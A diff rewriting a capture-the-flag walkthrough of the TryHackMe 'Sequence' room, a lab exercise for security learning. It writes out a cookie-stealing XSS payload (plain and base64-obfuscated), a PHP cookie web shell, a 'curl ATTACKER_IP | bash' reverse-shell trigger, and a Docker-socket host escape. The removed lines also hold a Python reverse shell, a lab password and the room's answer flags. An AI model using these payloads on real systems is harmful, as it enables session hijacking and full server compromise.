@@ -1,205 +1,130 @@
 ![Congrats](assets/screenshots/sequence/congrats.png)
 
-# TryHackMe – Sequence: Complete Walkthrough
+# Sequence — TryHackMe
+**Room Link:** [Sequence](https://tryhackme.com/room/sequence)
 
-**Room:** Sequence  
-**Platform:** TryHackMe  
-**Difficulty:** Medium  
-**Objective:** Chain multiple vulnerabilities to gain full control of the system.
+## Overview
+The Sequence room on TryHackMe is officially rated as a Medium difficulty challenge. The core objective is to chain multiple vulnerabilities to gain full control of the system. This involves exploiting stored XSS, CSRF, parameter tampering, unrestricted file upload, and a Docker container escape.
 
-## Tools Used
-- **Nmap** – port scanning
-- **FFUF** – directory fuzzing
-- **Python HTTP server** – hosting payloads and exfiltrating data
-- **Netcat** – reverse shell listener
-- **Curl** – sending crafted HTTP requests
-- **Browser DevTools** – cookie manipulation, source inspection, and request editing
-
----
-
-## Step 1: Reconnaissance
-We added the target domain to our `/etc/hosts` file:
+## Reconnaissance
+We start by adding the target domain to our `/etc/hosts` file:
 
 ```bash
 echo "10.48.166.194 review.thm" >> /etc/hosts
 ```
 
-### Nmap Scan
+Then we use Nmap to identify open ports:
 ```bash
 nmap -p- -sV -sC -Pn review.thm
 ```
 - **Port 22 (SSH)** – OpenSSH 8.2p1
 - **Port 80 (HTTP)** – Apache 2.4.41 with PHP
 
-Critical finding: The `PHPSESSID` cookie had no HttpOnly flag – meaning JavaScript could access it, making XSS attacks very dangerous.
+Critical finding: The `PHPSESSID` cookie had no `HttpOnly` flag – meaning JavaScript could access it, making XSS attacks very dangerous.
 
-### Directory Fuzzing
+We also performed directory fuzzing:
 ```bash
 ffuf -u http://review.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e php,txt
 ```
-We found `/mail/` with directory listing enabled. Inside, `dump.txt` contained:
+We found `/mail/` with directory listing enabled. Inside, a file named `dump.txt` leaked sensitive information:
 
 ```text
 From: software@review.thm
 ...
 The Finance panel (`/finance.php`) is hosted on the internal 192.x network.
-Access is protected with password: S60u}f5j
+Access is protected with password: [REDACTED]
 ```
 
 This leak gave us:
 1. A password for internal panels
 2. Two hidden endpoints: `/finance.php` and `/lottery.php`
 
----
-
-## Step 2: Stored XSS – Getting the Mod Flag
-The contact form allowed arbitrary HTML/JavaScript injection. We used a self‑contained payload that didn't require hosting a separate `.js` file.
+## Stored XSS to Steal Session Cookie
+The contact form allowed arbitrary HTML/JavaScript injection. We used a self-contained payload that didn't require hosting a separate `.js` file.
 
 We started a Python HTTP server to capture the exfiltrated cookie:
-
 ```bash
 python3 -m http.server 80
 ```
 
-**Payload #1 (plain):**
-```html
-<img src=x onerror="fetch('http://10.48.80.90/?c='+document.cookie)">
-```
-This triggers the `onerror` event when the image fails to load, sending the cookie to our server.
-
-**Payload #2 (base64‑encoded, filter bypass):**
+We submitted a base64-encoded SVG payload in the contact form’s message field to bypass basic filters:
 ```html
 <svg onload="eval(atob('ZmV0Y2goJ2h0dHA6Ly8xMC40OC44MC45MC8/Yz0nICsgZG9jdW1lbnQuY29va2llKQ=='))">
 ```
-The base64 decodes to `fetch('http://10.48.80.90/?c='+document.cookie)`, which may bypass client‑side filters.
 
-We submitted one of these payloads in the contact form’s message field. The moderator bot visited our submission, and we received a request containing the session cookie:
-
+The moderator bot visited our submission, and our server received a request containing their session cookie:
 ```text
-GET /?c=PHPSESSID=vcprv32n1q36jctbla8gtclk41
+GET /?c=PHPSESSID=[REDACTED]
 ```
 
-We replaced our own `PHPSESSID` cookie with this value (using Firefox DevTools → Storage → Cookies) and refreshed the page. Viewing the page source (Ctrl+U) revealed the mod flag in the navigation bar:
+We replaced our own `PHPSESSID` cookie with this value using Browser DevTools and refreshed the page. Viewing the page source revealed the mod flag in the navigation bar:
 
 ![Mod Flag](assets/screenshots/sequence/flag1.png)
 
-```text
-THM{M0dH@ck3dPawned007}
-```
+## Privilege Escalation via CSRF
+As a moderator, we had access to a Chat feature. The admin account automatically opened any link we sent in the chat.
 
----
+In the Settings page, we found a "Promote Co-Admin" feature. It required a CSRF token, but the token never changed and was simply the MD5 hash of the username. 
+We verified this by cracking the token for our `mod` user.
 
-## Step 3: CSRF – Privilege Escalation to Admin
-As mod, we had access to a Chat feature. The admin account automatically opened any link we sent in the chat.
-
-In the Settings page, we found a Promote Co‑Admin feature. It required a CSRF token, but we noticed that the token never changed and was simply the MD5 hash of the username.
-We cracked the token `ad148a3ca8bd0ef3b48c52454c493ec5` → `mod` (using online tools or hashcat).
-
-We then generated the token for admin:
+We then generated the token for the `admin` user:
 ```bash
 echo -n "admin" | md5sum
-# 21232f297a57a5a743894a0e4a801fc3
+# [REDACTED]
 ```
 
-We sent this link via chat:
+We sent the crafted link via the chat feature:
 ```text
-http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
+http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=[REDACTED]
 ```
-The admin visited it, and our `mod` account was promoted to admin.
-We logged out and back in. Now the admin dashboard was visible, and the admin flag appeared in the page source:
+The admin visited it, and our `mod` account was promoted to admin. After relogging, the admin dashboard was visible, and the admin flag appeared in the page source:
 
 ![Admin Flag](assets/screenshots/sequence/flag2.png)
 
-```text
-THM{Adm1NPawned007}
-```
+## Internal Panel Access via Parameter Tampering
+The admin dashboard featured a "Lottery" function. However, we knew about the `/finance.php` endpoint from the earlier leak.
 
----
+Using Firefox DevTools (Network tab), we intercepted the POST request for the Lottery Feature. We changed the `feature` parameter from `lottery.php` to `finance.php` and resent it.
 
-## Step 4: Accessing the Internal Finance Panel
-The admin dashboard had a Lottery Feature, but we knew about the `/finance.php` endpoint from the leak.
-We used Firefox DevTools (Network tab) to intercept the POST request when selecting "Lottery Feature".
-We edited the request and changed the `feature` parameter from `lottery.php` to `finance.php`, then resent it.
+The page displayed a password prompt. We entered the password `[REDACTED]` from the earlier leak, which granted us access to a file upload form.
 
-The page displayed a password prompt. We entered `S60u}f5j` – the password from the earlier leak.
-A file upload form appeared.
-
----
-
-## Step 5: Remote Code Execution (RCE)
-We uploaded a simple PHP shell that reads commands from a cookie (to avoid parameter issues).
-File `shell_cookie.php`:
+## Remote Code Execution (RCE)
+To exploit the file upload, we created a simple PHP shell that reads commands from a cookie to avoid parameter sanitization issues (`shell_cookie.php`):
 
 ```php
 <?php system($_COOKIE["x"]); ?>
 ```
 
-After uploading, we triggered it using curl with the `x` cookie set to our reverse shell command:
+After uploading the shell, we triggered it using `curl` with the `x` cookie set to our reverse shell command:
 ```bash
-curl -b "PHPSESSID=...; x=curl 10.48.80.90 | bash" -X POST -d "feature=uploads/shell_cookie.php" http://review.thm/dashboard.php
+curl -b "PHPSESSID=[REDACTED]; x=curl ATTACKER_IP | bash" -X POST -d "feature=uploads/shell_cookie.php" http://review.thm/dashboard.php
 ```
 
-We had already set up a Python HTTP server serving a reverse shell payload:
-```bash
-echo 'python3 -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"10.48.80.90\",443));os.dup2(...);import pty;pty.spawn(\"sh\")"' > index.html
-python3 -m http.server 80
-```
-And a Netcat listener:
-```bash
-nc -lvnp 443
-```
-The request executed the reverse shell, and we received a root shell inside a Docker container.
+With our Netcat listener ready, the request executed our reverse shell payload, granting us a shell inside a Docker container.
 
----
-
-## Step 6: Docker Escape – Reading the Root Flag
+## Docker Escape to Root
 Inside the container, we checked for the Docker socket:
-
 ```bash
 ls -la /var/run/docker.sock
 ```
-It was mounted – meaning we could interact with the host’s Docker daemon.
+It was mounted inside the container, meaning we could interact with the host’s Docker daemon.
 
-We listed available images:
+We listed the available images and found `phpvulnerable:latest`:
 ```bash
 docker image ls
 ```
-We saw `phpvulnerable:latest`.
 
-We ran a new container that mounted the host’s entire filesystem at `/mnt`:
+We exploited the socket by running a new container that mounted the host’s entire filesystem at `/mnt`:
 ```bash
 docker run -v /:/mnt --rm -it phpvulnerable:latest bash
 ```
 
-Inside this new container, we navigated to `/mnt/root/` and read the final flag:
+Inside this new container, we navigated to `/mnt/root/` on the host filesystem and read the final flag:
 ```bash
 cat /mnt/root/flag.txt
 ```
 
 ![Root Flag](assets/screenshots/sequence/flag3.png)
 
-```text
-THM{rootAccessD0n3}
-```
-
----
-
-## Summary of Flags
-
-| Role | Flag |
-| :--- | :--- |
-| **Mod** | `THM{M0dH@ck3dPawned007}` |
-| **Admin** | `THM{Adm1NPawned007}` |
-| **Root** | `THM{rootAccessD0n3}` |
-
----
-
-## Key Takeaways
-- Leaked files can contain sensitive data (`dump.txt`).
-- XSS with missing `HttpOnly` is a serious risk.
-- Predictable CSRF tokens (MD5 of username) are trivial to bypass.
-- Parameter tampering can expose hidden internal endpoints.
-- Unrestricted file upload leads to remote code execution.
-- Mounting Docker socket inside containers enables easy escape to the host.
-
-_Room completed – June 2026_
+## Conclusion
+The Sequence room perfectly demonstrates how chained vulnerabilities can lead to complete system compromise. A single leaked text file provided the foundation, while a missing `HttpOnly` flag allowed session hijacking via XSS. From there, weak CSRF tokens allowed privilege escalation, and parameter tampering exposed an internal upload panel. Finally, a misconfigured Docker socket provided a trivial escape to root.
